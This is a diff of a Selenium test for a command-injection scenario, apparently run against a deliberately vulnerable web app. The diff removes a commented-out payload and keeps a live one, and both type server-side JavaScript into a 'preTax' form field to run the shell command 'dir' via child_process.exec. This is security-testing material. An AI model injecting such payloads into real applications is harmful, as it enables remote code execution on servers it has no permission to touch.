@@ -34,23 +34,15 @@ describe('Command Injection', function () {
         });
         after(async () => {
             //   requester.close();
-            //   driver.quit();
+               driver.quit();
         });
 
 
         it('Command', async () => {
 
-            driver.manage().logs()
             await driver.findElement(By.id('contributions-menu-link')).click();
 
             await driver.findElement(By.name("preTax")).clear();
-            /*       await driver.findElement(By.name("preTax")).sendKeys(
-                       ` var exec = require('child_process').exec; `+
-                       `function execute(command, callback){`+
-                       `exec("dir", function(error, stdout, stderr){ res.render("contributions", {updateError: stdout,userId: userId}) });}
-                       `+`execute("dir",'');`,
-                       Key.ENTER);*/
-
 
             await driver.findElement(By.name("preTax")).sendKeys(
                 ` var exec = require('child_process').exec;` +
